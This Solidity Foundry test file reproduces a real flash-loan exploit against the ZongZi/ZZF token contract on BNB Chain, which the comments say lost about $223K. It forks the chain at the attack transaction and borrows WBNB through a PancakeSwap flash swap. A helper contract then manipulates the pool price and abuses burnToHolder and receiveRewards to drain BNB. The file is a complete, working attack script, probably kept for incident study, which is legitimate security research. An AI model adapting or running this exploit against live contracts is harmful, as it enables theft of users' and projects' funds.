// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$223K
// Attacker : https://bscscan.com/address/0x2c42824ef89d6efa7847d3997266b62599560a26
// Attack Contract : https://bscscan.com/address/0x0bd0d9ba4f52db225b265c3cffa7bc4a418d22a9
// Vuln Contract : https://bscscan.com/address/0xb7a254237e05ccca0a756f75fb78ab2df222911b
// Attack txs : https://phalcon.blocksec.com/explorer/tx/bsc/0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f

// @Analysis
// https://twitter.com/0xNickLFranklin/status/1772195949638775262

interface IZZF is IERC20 {
    function burnToHolder(uint256 amount, address _invitation) external;

    function receiveRewards(address to) external;
}

contract ContractTest is Test {
    IWETH private constant WBNB =
        IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant ZongZi =
        IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    Uni_Pair_V2 private constant BUSDT_WBNB =
        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 private constant WBNB_ZONGZI =
        Uni_Pair_V2(0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant attackContract =
        0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9;
    bytes32 private constant attackTx =
        hex"247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f";

    function setUp() public {
        vm.createSelectFork("bsc", attackTx);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(ZongZi), "ZongZi");
        vm.label(address(BUSDT_WBNB), "BUSDT_WBNB");
        vm.label(address(WBNB_ZONGZI), "WBNB_ZONGZI");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            18
        );

        uint256 pairWBNBBalance = WBNB.balanceOf(address(WBNB_ZONGZI));
        uint256 multiplier = uint256(
            vm.load(attackContract, bytes32(uint256(9)))
        );

        uint256 amount1Out = (pairWBNBBalance * multiplier) /
            ((pairWBNBBalance * 100) / address(ZongZi).balance);

        BUSDT_WBNB.swap(0, amount1Out, address(this), abi.encode(uint8(1)));

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            18
        );
    }

    function pancakeCall(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        Helper helper = new Helper();
        WBNB.transfer(address(helper), _amount1);
        helper.exploit();

        ZongZi.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(WBNB);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ZongZi.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 86400
        );
        WBNB.transfer(address(BUSDT_WBNB), (_amount1 * 10026) / 10000);
    }
}

contract Helper {
    IWETH private constant WBNB =
        IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant ZongZi =
        IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    IZZF private constant ZZF =
        IZZF(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function exploit() external {
        WBNB.approve(address(Router), type(uint256).max);
        ZongZi.approve(address(Router), type(uint256).max);
        uint256 balanceBeforeWBNB = WBNB.balanceOf(address(this));

        makeSwap(1e17, address(WBNB), address(ZongZi));
        makeSwap(
            ZongZi.balanceOf(address(this)),
            address(ZongZi),
            address(WBNB)
        );

        uint256 amountIn = balanceBeforeWBNB - 1e17;
        makeSwap(amountIn, address(WBNB), address(ZongZi));

        uint256 amountOut = address(ZongZi).balance - 1e9;
        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(WBNB);
        uint256[] memory amounts = Router.getAmountsIn(amountOut, path);

        ZZF.burnToHolder(amounts[0], msg.sender);
        ZZF.receiveRewards(address(this));

        makeSwap(
            ZongZi.balanceOf(address(this)),
            address(ZongZi),
            address(WBNB)
        );

        WBNB.deposit{value: address(this).balance}();
        WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
    }

    function makeSwap(
        uint256 amountIn,
        address tokenA,
        address tokenB
    ) private {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 86400
        );
    }

    receive() external payable {}
}
